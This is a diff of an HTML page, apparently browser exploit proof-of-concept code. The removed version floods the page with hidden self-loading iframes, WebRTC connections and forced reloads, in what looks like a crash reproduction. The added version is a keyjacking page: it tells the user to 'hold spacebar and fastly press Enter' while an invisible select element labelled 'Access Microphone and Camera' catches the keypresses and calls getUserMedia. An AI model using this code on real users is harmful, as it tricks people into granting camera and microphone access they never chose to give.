@@ -1,74 +1,90 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Audio and Video Access</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      position: absolute;
+      margin-top: 20px;
+    }
+    .message {
+      width: 100px;
+      margin-left: 50px;
+    }
+    .select-container {
+      margin-left: 80px;
+      margin-top: 20px;
+      z-index: 1;
+      position: absolute;
+    }
+    #sf {
+      width: 200px;
+      opacity: 0;
+    }
+    video {
+      max-width: 100%;
+      margin-top: 20px;
+    }
+  </style>
 </head>
-<div id="local">
-    <video autoplay playsinline></video>
-</div>
+<body id="xx" onload="initialize()">
 
-<div id="remote">
-    <video autoplay playsinline></video>
-</div>
+  <div class="container">
+    <label>
+      <span class="message">HOLD SPACEBAR AND FASTLY PRESS ENTER</span>
+    </label>
+  </div>
 
-<body>
-    <script type="module">
-        function createIframes() {
-            if (top != self) return;
-            for (var i = 0; i < 100; i++) {
-                var iframe = document.createElement('iframe');
-                iframe.src = location.href;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-            }
-        }
-        createIframes();
-        async function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-        async function exchangeIceCandidates(pc1, pc2) {
-            const offer = await pc1.createOffer();
-            await pc1.setLocalDescription(offer);
-            await pc2.setRemoteDescription(offer);
-            const answer = await pc2.createAnswer();
-            await pc2.setLocalDescription(answer);
-            await pc1.setRemoteDescription(answer);
-        }
-        var pc1;
-        var pc2;
-        async function main() {
-            var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-            document.querySelector('div#local video').srcObject = stream;
-            pc1 = new RTCPeerConnection();
-            pc2 = new RTCPeerConnection();
-            stream.getTracks().forEach(track => pc1.addTrack(track, stream));
-            pc1.onicecandidate = e => pc2.addIceCandidate(e.candidate);
-            pc2.ontrack = e => document.querySelector('div#remote video').srcObject = e.streams[0];
-            await exchangeIceCandidates(pc1, pc2);
-            await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-            pc1.getSenders().forEach(async sender => {
-                let params = sender.getParameters();
-                params.encodings[0].active = false;
-                await sender.setParameters(params);
-            });
-        }
-        await main().catch(e => {
-            console.log(e);
-            gc();
-            location.reload();
+  <div class="select-container">
+    <span id="xz" style="width: 100px;"></span>
+    <select id="sf">
+      <option value="0">
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        Access Microphone and Camera
+      </option>
+    </select>
+  </div>
+
+  <script>
+    // This function will initialize and bind events to the select element
+    function initialize() {
+      const selectElement = document.getElementById("sf");
+      selectElement.addEventListener('click', getMedia);
+      selectElement.addEventListener('dblclick', getMedia);
+      selectElement.addEventListener('keypress', getMedia);
+    }
+
+    // Function to get the audio and video stream from the user's microphone and camera
+    function getMedia() {
+      navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+        .then(function(stream) {
+          // Successfully received the audio and video streams
+          const audioContext = new AudioContext();
+          const audioSource = audioContext.createMediaStreamSource(stream);
+          
+          // Create a video element to display the camera feed
+          const videoElement = document.createElement("video");
+          videoElement.srcObject = stream;
+          videoElement.autoplay = true;
+          videoElement.playsInline = true; // For mobile devices to autoplay inline
+          
+          // Optionally, append the video element to the body to show the camera feed
+          document.body.appendChild(videoElement);
+
+          console.log("Audio and video stream received");
+        })
+        .catch(function(err) {
+          // Handle errors, such as permission denied or device issues
+          console.error('Error accessing media devices:', err);
+          alert("Failed to access microphone or camera: " + err.message);
         });
+    }
+  </script>
 
-        setTimeout(function () {
-            location.reload();
-        }, 3000);
-
-
-
-
-
-
-
-
-
-
-    </script>
+</body>
+</html>
